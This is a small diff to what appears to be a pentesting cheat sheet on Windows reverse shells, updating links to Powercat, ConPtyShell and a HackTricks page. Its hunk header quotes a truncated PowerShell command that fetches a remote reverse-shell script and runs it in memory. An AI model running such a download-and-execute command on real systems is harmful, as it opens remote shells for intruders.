@@ -137,13 +137,13 @@ PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master
 
 - [Arno0x: PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)
 
-- [Powercat](https://github.com/besimorhino/powercat)
+- [besimorhino: Powercat](https://github.com/besimorhino/powercat)
 
 - [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
 
 ### Hacktricks
 
-- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
+- [Hacktricks: Shell Windows](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)
 
 ### Ironhackers
 
